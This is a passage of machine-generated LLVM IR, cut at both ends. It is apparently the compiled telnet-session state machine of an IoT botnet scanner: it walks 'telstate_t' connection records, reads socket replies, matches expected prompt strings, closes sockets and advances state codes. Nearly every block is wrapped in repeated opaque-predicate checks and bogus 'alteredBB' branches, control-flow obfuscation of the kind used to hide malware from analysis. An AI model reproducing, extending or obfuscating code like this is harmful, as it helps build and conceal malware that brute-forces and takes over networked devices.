  call void @llvm.memset.p0i8.i64(i8* %2169, i8 0, i64 1024, i32 1, i1 false)
  %2170 = load i32, i32* %10, align 4
  %2171 = sext i32 %2170 to i64
  %2172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2171
  %2173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2172, i32 0, i32 0
  %2174 = load i32, i32* %2173, align 16
  %2175 = call i32 @sclose(i32 %2174)
  %2176 = load i32, i32* %10, align 4
  %2177 = sext i32 %2176 to i64
  %2178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2177
  %2179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2178, i32 0, i32 2
  store i8 0, i8* %2179, align 8
  %2180 = load i32, i32* %10, align 4
  %2181 = sext i32 %2180 to i64
  %2182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2181
  %2183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2182, i32 0, i32 3
  store i8 0, i8* %2183, align 1
  %2184 = load i32, i32* @x.67
  %2185 = load i32, i32* @y.68
  %2186 = sub i32 %2184, 1
  %2187 = mul i32 %2184, %2186
  %2188 = urem i32 %2187, 2
  %2189 = icmp eq i32 %2188, 0
  %2190 = icmp slt i32 %2185, 10
  %2191 = or i1 %2189, %2190
  br i1 %2191, label %originalBBpart2251, label %originalBB249alteredBB

originalBBpart2251:                               ; preds = %originalBB249
  br label %3344

; <label>:2192:                                   ; preds = %2140
  %2193 = load i32, i32* %10, align 4
  %2194 = sext i32 %2193 to i64
  %2195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2194
  %2196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2195, i32 0, i32 2
  store i8 7, i8* %2196, align 8
  br label %2197

; <label>:2197:                                   ; preds = %2192
  %2198 = load i32, i32* %10, align 4
  %2199 = sext i32 %2198 to i64
  %2200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2199
  %2201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2200, i32 0, i32 8
  %2202 = load i8*, i8** %2201, align 8
  call void @llvm.memset.p0i8.i64(i8* %2202, i8 0, i64 1024, i32 1, i1 false)
  br label %3344

; <label>:2203:                                   ; preds = %2121
  %2204 = load i32, i32* %10, align 4
  %2205 = sext i32 %2204 to i64
  %2206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2205
  %2207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2206, i32 0, i32 0
  %2208 = load i32, i32* %2207, align 16
  %2209 = load i32, i32* %10, align 4
  %2210 = sext i32 %2209 to i64
  %2211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2210
  %2212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2211, i32 0, i32 8
  %2213 = load i8*, i8** %2212, align 8
  %2214 = load i32, i32* %10, align 4
  %2215 = sext i32 %2214 to i64
  %2216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2215
  %2217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2216, i32 0, i32 7
  %2218 = load i16, i16* %2217, align 16
  %2219 = zext i16 %2218 to i32
  %2220 = call i32 @readUntil(i32 %2208, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2213, i32 1024, i32 %2219)
  %2221 = icmp ne i32 %2220, 0
  br i1 %2221, label %2222, label %2285

; <label>:2222:                                   ; preds = %2203
  %2223 = load i32, i32* @x.67
  %2224 = load i32, i32* @y.68
  %2225 = sub i32 %2223, 1
  %2226 = mul i32 %2223, %2225
  %2227 = urem i32 %2226, 2
  %2228 = icmp eq i32 %2227, 0
  %2229 = icmp slt i32 %2224, 10
  %2230 = or i1 %2228, %2229
  br i1 %2230, label %originalBB253, label %originalBB253alteredBB

originalBB253:                                    ; preds = %originalBB253alteredBB, %2222
  %2231 = load i32, i32* %10, align 4
  %2232 = sext i32 %2231 to i64
  %2233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2232
  %2234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2233, i32 0, i32 6
  store i32 0, i32* %2234, align 4
  %2235 = load i32, i32* %10, align 4
  %2236 = sext i32 %2235 to i64
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2236
  %2238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2237, i32 0, i32 7
  store i16 0, i16* %2238, align 16
  %2239 = load i32, i32* %10, align 4
  %2240 = sext i32 %2239 to i64
  %2241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2240
  %2242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2241, i32 0, i32 8
  %2243 = load i8*, i8** %2242, align 8
  %2244 = call i8* @strstr(i8* %2243, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %2245 = icmp ne i8* %2244, null
  %2246 = load i32, i32* @x.67
  %2247 = load i32, i32* @y.68
  %2248 = sub i32 %2246, 1
  %2249 = mul i32 %2246, %2248
  %2250 = urem i32 %2249, 2
  %2251 = icmp eq i32 %2250, 0
  %2252 = icmp slt i32 %2247, 10
  %2253 = or i1 %2251, %2252
  br i1 %2253, label %originalBBpart2255, label %originalBB253alteredBB

originalBBpart2255:                               ; preds = %originalBB253
  br i1 %2245, label %2254, label %2274

; <label>:2254:                                   ; preds = %originalBBpart2255
  %2255 = load i32, i32* %10, align 4
  %2256 = sext i32 %2255 to i64
  %2257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2256
  %2258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2257, i32 0, i32 8
  %2259 = load i8*, i8** %2258, align 8
  call void @llvm.memset.p0i8.i64(i8* %2259, i8 0, i64 1024, i32 1, i1 false)
  %2260 = load i32, i32* %10, align 4
  %2261 = sext i32 %2260 to i64
  %2262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2261
  %2263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2262, i32 0, i32 0
  %2264 = load i32, i32* %2263, align 16
  %2265 = call i32 @sclose(i32 %2264)
  %2266 = load i32, i32* %10, align 4
  %2267 = sext i32 %2266 to i64
  %2268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2267
  %2269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2268, i32 0, i32 2
  store i8 0, i8* %2269, align 8
  %2270 = load i32, i32* %10, align 4
  %2271 = sext i32 %2270 to i64
  %2272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2271
  %2273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2272, i32 0, i32 3
  store i8 0, i8* %2273, align 1
  br label %3344

; <label>:2274:                                   ; preds = %originalBBpart2255
  %2275 = load i32, i32* %10, align 4
  %2276 = sext i32 %2275 to i64
  %2277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2276
  %2278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2277, i32 0, i32 2
  store i8 7, i8* %2278, align 8
  br label %2279

; <label>:2279:                                   ; preds = %2274
  %2280 = load i32, i32* %10, align 4
  %2281 = sext i32 %2280 to i64
  %2282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2281
  %2283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2282, i32 0, i32 8
  %2284 = load i8*, i8** %2283, align 8
  call void @llvm.memset.p0i8.i64(i8* %2284, i8 0, i64 1024, i32 1, i1 false)
  br label %3344

; <label>:2285:                                   ; preds = %2203
  %2286 = load i32, i32* %10, align 4
  %2287 = sext i32 %2286 to i64
  %2288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2287
  %2289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2288, i32 0, i32 0
  %2290 = load i32, i32* %2289, align 16
  %2291 = load i32, i32* %10, align 4
  %2292 = sext i32 %2291 to i64
  %2293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2292
  %2294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2293, i32 0, i32 8
  %2295 = load i8*, i8** %2294, align 8
  %2296 = load i32, i32* %10, align 4
  %2297 = sext i32 %2296 to i64
  %2298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2297
  %2299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2298, i32 0, i32 7
  %2300 = load i16, i16* %2299, align 16
  %2301 = zext i16 %2300 to i32
  %2302 = call i32 @readUntil(i32 %2290, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2295, i32 1024, i32 %2301)
  %2303 = icmp ne i32 %2302, 0
  br i1 %2303, label %2304, label %2399

; <label>:2304:                                   ; preds = %2285
  %2305 = load i32, i32* @x.67
  %2306 = load i32, i32* @y.68
  %2307 = sub i32 %2305, 1
  %2308 = mul i32 %2305, %2307
  %2309 = urem i32 %2308, 2
  %2310 = icmp eq i32 %2309, 0
  %2311 = icmp slt i32 %2306, 10
  %2312 = or i1 %2310, %2311
  br i1 %2312, label %originalBB257, label %originalBB257alteredBB

originalBB257:                                    ; preds = %originalBB257alteredBB, %2304
  %2313 = load i32, i32* %10, align 4
  %2314 = sext i32 %2313 to i64
  %2315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2314
  %2316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2315, i32 0, i32 6
  store i32 0, i32* %2316, align 4
  %2317 = load i32, i32* %10, align 4
  %2318 = sext i32 %2317 to i64
  %2319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2318
  %2320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2319, i32 0, i32 7
  store i16 0, i16* %2320, align 16
  %2321 = load i32, i32* %10, align 4
  %2322 = sext i32 %2321 to i64
  %2323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2322
  %2324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2323, i32 0, i32 8
  %2325 = load i8*, i8** %2324, align 8
  %2326 = call i8* @strstr(i8* %2325, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %2327 = icmp ne i8* %2326, null
  %2328 = load i32, i32* @x.67
  %2329 = load i32, i32* @y.68
  %2330 = sub i32 %2328, 1
  %2331 = mul i32 %2328, %2330
  %2332 = urem i32 %2331, 2
  %2333 = icmp eq i32 %2332, 0
  %2334 = icmp slt i32 %2329, 10
  %2335 = or i1 %2333, %2334
  br i1 %2335, label %originalBBpart2259, label %originalBB257alteredBB

originalBBpart2259:                               ; preds = %originalBB257
  br i1 %2327, label %2336, label %2356

; <label>:2336:                                   ; preds = %originalBBpart2259
  %2337 = load i32, i32* %10, align 4
  %2338 = sext i32 %2337 to i64
  %2339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2338
  %2340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2339, i32 0, i32 8
  %2341 = load i8*, i8** %2340, align 8
  call void @llvm.memset.p0i8.i64(i8* %2341, i8 0, i64 1024, i32 1, i1 false)
  %2342 = load i32, i32* %10, align 4
  %2343 = sext i32 %2342 to i64
  %2344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2343
  %2345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2344, i32 0, i32 0
  %2346 = load i32, i32* %2345, align 16
  %2347 = call i32 @sclose(i32 %2346)
  %2348 = load i32, i32* %10, align 4
  %2349 = sext i32 %2348 to i64
  %2350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2349
  %2351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2350, i32 0, i32 2
  store i8 0, i8* %2351, align 8
  %2352 = load i32, i32* %10, align 4
  %2353 = sext i32 %2352 to i64
  %2354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2353
  %2355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2354, i32 0, i32 3
  store i8 0, i8* %2355, align 1
  br label %3344

; <label>:2356:                                   ; preds = %originalBBpart2259
  %2357 = load i32, i32* @x.67
  %2358 = load i32, i32* @y.68
  %2359 = sub i32 %2357, 1
  %2360 = mul i32 %2357, %2359
  %2361 = urem i32 %2360, 2
  %2362 = icmp eq i32 %2361, 0
  %2363 = icmp slt i32 %2358, 10
  %2364 = or i1 %2362, %2363
  br i1 %2364, label %originalBB261, label %originalBB261alteredBB

originalBB261:                                    ; preds = %originalBB261alteredBB, %2356
  %2365 = load i32, i32* %10, align 4
  %2366 = sext i32 %2365 to i64
  %2367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2366
  %2368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2367, i32 0, i32 2
  store i8 7, i8* %2368, align 8
  %2369 = load i32, i32* @x.67
  %2370 = load i32, i32* @y.68
  %2371 = sub i32 %2369, 1
  %2372 = mul i32 %2369, %2371
  %2373 = urem i32 %2372, 2
  %2374 = icmp eq i32 %2373, 0
  %2375 = icmp slt i32 %2370, 10
  %2376 = or i1 %2374, %2375
  br i1 %2376, label %originalBBpart2263, label %originalBB261alteredBB

originalBBpart2263:                               ; preds = %originalBB261
  br label %2377

; <label>:2377:                                   ; preds = %originalBBpart2263
  %2378 = load i32, i32* @x.67
  %2379 = load i32, i32* @y.68
  %2380 = sub i32 %2378, 1
  %2381 = mul i32 %2378, %2380
  %2382 = urem i32 %2381, 2
  %2383 = icmp eq i32 %2382, 0
  %2384 = icmp slt i32 %2379, 10
  %2385 = or i1 %2383, %2384
  br i1 %2385, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %2377
  %2386 = load i32, i32* %10, align 4
  %2387 = sext i32 %2386 to i64
  %2388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2387
  %2389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2388, i32 0, i32 8
  %2390 = load i8*, i8** %2389, align 8
  call void @llvm.memset.p0i8.i64(i8* %2390, i8 0, i64 1024, i32 1, i1 false)
  %2391 = load i32, i32* @x.67
  %2392 = load i32, i32* @y.68
  %2393 = sub i32 %2391, 1
  %2394 = mul i32 %2391, %2393
  %2395 = urem i32 %2394, 2
  %2396 = icmp eq i32 %2395, 0
  %2397 = icmp slt i32 %2392, 10
  %2398 = or i1 %2396, %2397
  br i1 %2398, label %originalBBpart2267, label %originalBB265alteredBB

originalBBpart2267:                               ; preds = %originalBB265
  br label %3344

; <label>:2399:                                   ; preds = %2285
  %2400 = load i32, i32* %10, align 4
  %2401 = sext i32 %2400 to i64
  %2402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2401
  %2403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2402, i32 0, i32 0
  %2404 = load i32, i32* %2403, align 16
  %2405 = load i32, i32* %10, align 4
  %2406 = sext i32 %2405 to i64
  %2407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2406
  %2408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2407, i32 0, i32 8
  %2409 = load i8*, i8** %2408, align 8
  %2410 = load i32, i32* %10, align 4
  %2411 = sext i32 %2410 to i64
  %2412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2411
  %2413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2412, i32 0, i32 7
  %2414 = load i16, i16* %2413, align 16
  %2415 = zext i16 %2414 to i32
  %2416 = call i32 @readUntil(i32 %2404, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2409, i32 1024, i32 %2415)
  %2417 = icmp ne i32 %2416, 0
  br i1 %2417, label %2418, label %2513

; <label>:2418:                                   ; preds = %2399
  %2419 = load i32, i32* @x.67
  %2420 = load i32, i32* @y.68
  %2421 = sub i32 %2419, 1
  %2422 = mul i32 %2419, %2421
  %2423 = urem i32 %2422, 2
  %2424 = icmp eq i32 %2423, 0
  %2425 = icmp slt i32 %2420, 10
  %2426 = or i1 %2424, %2425
  br i1 %2426, label %originalBB269, label %originalBB269alteredBB

originalBB269:                                    ; preds = %originalBB269alteredBB, %2418
  %2427 = load i32, i32* %10, align 4
  %2428 = sext i32 %2427 to i64
  %2429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2428
  %2430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2429, i32 0, i32 6
  store i32 0, i32* %2430, align 4
  %2431 = load i32, i32* %10, align 4
  %2432 = sext i32 %2431 to i64
  %2433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2432
  %2434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2433, i32 0, i32 7
  store i16 0, i16* %2434, align 16
  %2435 = load i32, i32* %10, align 4
  %2436 = sext i32 %2435 to i64
  %2437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2436
  %2438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2437, i32 0, i32 8
  %2439 = load i8*, i8** %2438, align 8
  %2440 = call i8* @strstr(i8* %2439, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %2441 = icmp ne i8* %2440, null
  %2442 = load i32, i32* @x.67
  %2443 = load i32, i32* @y.68
  %2444 = sub i32 %2442, 1
  %2445 = mul i32 %2442, %2444
  %2446 = urem i32 %2445, 2
  %2447 = icmp eq i32 %2446, 0
  %2448 = icmp slt i32 %2443, 10
  %2449 = or i1 %2447, %2448
  br i1 %2449, label %originalBBpart2271, label %originalBB269alteredBB

originalBBpart2271:                               ; preds = %originalBB269
  br i1 %2441, label %2450, label %2486

; <label>:2450:                                   ; preds = %originalBBpart2271
  %2451 = load i32, i32* @x.67
  %2452 = load i32, i32* @y.68
  %2453 = sub i32 %2451, 1
  %2454 = mul i32 %2451, %2453
  %2455 = urem i32 %2454, 2
  %2456 = icmp eq i32 %2455, 0
  %2457 = icmp slt i32 %2452, 10
  %2458 = or i1 %2456, %2457
  br i1 %2458, label %originalBB273, label %originalBB273alteredBB

originalBB273:                                    ; preds = %originalBB273alteredBB, %2450
  %2459 = load i32, i32* %10, align 4
  %2460 = sext i32 %2459 to i64
  %2461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2460
  %2462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2461, i32 0, i32 8
  %2463 = load i8*, i8** %2462, align 8
  call void @llvm.memset.p0i8.i64(i8* %2463, i8 0, i64 1024, i32 1, i1 false)
  %2464 = load i32, i32* %10, align 4
  %2465 = sext i32 %2464 to i64
  %2466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2465
  %2467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2466, i32 0, i32 0
  %2468 = load i32, i32* %2467, align 16
  %2469 = call i32 @sclose(i32 %2468)
  %2470 = load i32, i32* %10, align 4
  %2471 = sext i32 %2470 to i64
  %2472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2471
  %2473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2472, i32 0, i32 2
  store i8 0, i8* %2473, align 8
  %2474 = load i32, i32* %10, align 4
  %2475 = sext i32 %2474 to i64
  %2476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2475
  %2477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2476, i32 0, i32 3
  store i8 0, i8* %2477, align 1
  %2478 = load i32, i32* @x.67
  %2479 = load i32, i32* @y.68
  %2480 = sub i32 %2478, 1
  %2481 = mul i32 %2478, %2480
  %2482 = urem i32 %2481, 2
  %2483 = icmp eq i32 %2482, 0
  %2484 = icmp slt i32 %2479, 10
  %2485 = or i1 %2483, %2484
  br i1 %2485, label %originalBBpart2276, label %originalBB273alteredBB

originalBBpart2276:                               ; preds = %originalBB273
  br label %3344

; <label>:2486:                                   ; preds = %originalBBpart2271
  %2487 = load i32, i32* %10, align 4
  %2488 = sext i32 %2487 to i64
  %2489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2488
  %2490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2489, i32 0, i32 2
  store i8 7, i8* %2490, align 8
  br label %2491

; <label>:2491:                                   ; preds = %2486
  %2492 = load i32, i32* @x.67
  %2493 = load i32, i32* @y.68
  %2494 = sub i32 %2492, 1
  %2495 = mul i32 %2492, %2494
  %2496 = urem i32 %2495, 2
  %2497 = icmp eq i32 %2496, 0
  %2498 = icmp slt i32 %2493, 10
  %2499 = or i1 %2497, %2498
  br i1 %2499, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %2491
  %2500 = load i32, i32* %10, align 4
  %2501 = sext i32 %2500 to i64
  %2502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2501
  %2503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2502, i32 0, i32 8
  %2504 = load i8*, i8** %2503, align 8
  call void @llvm.memset.p0i8.i64(i8* %2504, i8 0, i64 1024, i32 1, i1 false)
  %2505 = load i32, i32* @x.67
  %2506 = load i32, i32* @y.68
  %2507 = sub i32 %2505, 1
  %2508 = mul i32 %2505, %2507
  %2509 = urem i32 %2508, 2
  %2510 = icmp eq i32 %2509, 0
  %2511 = icmp slt i32 %2506, 10
  %2512 = or i1 %2510, %2511
  br i1 %2512, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br label %3344

; <label>:2513:                                   ; preds = %2399
  %2514 = load i32, i32* %10, align 4
  %2515 = sext i32 %2514 to i64
  %2516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2515
  %2517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2516, i32 0, i32 0
  %2518 = load i32, i32* %2517, align 16
  %2519 = load i32, i32* %10, align 4
  %2520 = sext i32 %2519 to i64
  %2521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2520
  %2522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2521, i32 0, i32 8
  %2523 = load i8*, i8** %2522, align 8
  %2524 = load i32, i32* %10, align 4
  %2525 = sext i32 %2524 to i64
  %2526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2525
  %2527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2526, i32 0, i32 7
  %2528 = load i16, i16* %2527, align 16
  %2529 = zext i16 %2528 to i32
  %2530 = call i32 @readUntil(i32 %2518, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2523, i32 1024, i32 %2529)
  %2531 = icmp ne i32 %2530, 0
  br i1 %2531, label %2532, label %2579

; <label>:2532:                                   ; preds = %2513
  %2533 = load i32, i32* %10, align 4
  %2534 = sext i32 %2533 to i64
  %2535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2534
  %2536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2535, i32 0, i32 6
  store i32 0, i32* %2536, align 4
  %2537 = load i32, i32* %10, align 4
  %2538 = sext i32 %2537 to i64
  %2539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2538
  %2540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2539, i32 0, i32 7
  store i16 0, i16* %2540, align 16
  %2541 = load i32, i32* %10, align 4
  %2542 = sext i32 %2541 to i64
  %2543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2542
  %2544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2543, i32 0, i32 8
  %2545 = load i8*, i8** %2544, align 8
  %2546 = call i8* @strstr(i8* %2545, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %2547 = icmp ne i8* %2546, null
  br i1 %2547, label %2548, label %2568

; <label>:2548:                                   ; preds = %2532
  %2549 = load i32, i32* %10, align 4
  %2550 = sext i32 %2549 to i64
  %2551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2550
  %2552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2551, i32 0, i32 8
  %2553 = load i8*, i8** %2552, align 8
  call void @llvm.memset.p0i8.i64(i8* %2553, i8 0, i64 1024, i32 1, i1 false)
  %2554 = load i32, i32* %10, align 4
  %2555 = sext i32 %2554 to i64
  %2556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2555
  %2557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2556, i32 0, i32 0
  %2558 = load i32, i32* %2557, align 16
  %2559 = call i32 @sclose(i32 %2558)
  %2560 = load i32, i32* %10, align 4
  %2561 = sext i32 %2560 to i64
  %2562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2561
  %2563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2562, i32 0, i32 2
  store i8 0, i8* %2563, align 8
  %2564 = load i32, i32* %10, align 4
  %2565 = sext i32 %2564 to i64
  %2566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2565
  %2567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2566, i32 0, i32 3
  store i8 0, i8* %2567, align 1
  br label %3344

; <label>:2568:                                   ; preds = %2532
  %2569 = load i32, i32* %10, align 4
  %2570 = sext i32 %2569 to i64
  %2571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2570
  %2572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2571, i32 0, i32 2
  store i8 7, i8* %2572, align 8
  br label %2573

; <label>:2573:                                   ; preds = %2568
  %2574 = load i32, i32* %10, align 4
  %2575 = sext i32 %2574 to i64
  %2576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2575
  %2577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2576, i32 0, i32 8
  %2578 = load i8*, i8** %2577, align 8
  call void @llvm.memset.p0i8.i64(i8* %2578, i8 0, i64 1024, i32 1, i1 false)
  br label %3344

; <label>:2579:                                   ; preds = %2513
  %2580 = load i32, i32* @x.67
  %2581 = load i32, i32* @y.68
  %2582 = sub i32 %2580, 1
  %2583 = mul i32 %2580, %2582
  %2584 = urem i32 %2583, 2
  %2585 = icmp eq i32 %2584, 0
  %2586 = icmp slt i32 %2581, 10
  %2587 = or i1 %2585, %2586
  br i1 %2587, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2579
  %2588 = load i32, i32* %10, align 4
  %2589 = sext i32 %2588 to i64
  %2590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2589
  %2591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2590, i32 0, i32 0
  %2592 = load i32, i32* %2591, align 16
  %2593 = load i32, i32* %10, align 4
  %2594 = sext i32 %2593 to i64
  %2595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2594
  %2596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2595, i32 0, i32 8
  %2597 = load i8*, i8** %2596, align 8
  %2598 = load i32, i32* %10, align 4
  %2599 = sext i32 %2598 to i64
  %2600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2599
  %2601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2600, i32 0, i32 7
  %2602 = load i16, i16* %2601, align 16
  %2603 = zext i16 %2602 to i32
  %2604 = call i32 @readUntil(i32 %2592, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2597, i32 1024, i32 %2603)
  %2605 = icmp ne i32 %2604, 0
  %2606 = load i32, i32* @x.67
  %2607 = load i32, i32* @y.68
  %2608 = sub i32 %2606, 1
  %2609 = mul i32 %2606, %2608
  %2610 = urem i32 %2609, 2
  %2611 = icmp eq i32 %2610, 0
  %2612 = icmp slt i32 %2607, 10
  %2613 = or i1 %2611, %2612
  br i1 %2613, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br i1 %2605, label %2614, label %2661

; <label>:2614:                                   ; preds = %originalBBpart2284
  %2615 = load i32, i32* %10, align 4
  %2616 = sext i32 %2615 to i64
  %2617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2616
  %2618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2617, i32 0, i32 6
  store i32 0, i32* %2618, align 4
  %2619 = load i32, i32* %10, align 4
  %2620 = sext i32 %2619 to i64
  %2621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2620
  %2622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2621, i32 0, i32 7
  store i16 0, i16* %2622, align 16
  %2623 = load i32, i32* %10, align 4
  %2624 = sext i32 %2623 to i64
  %2625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2624
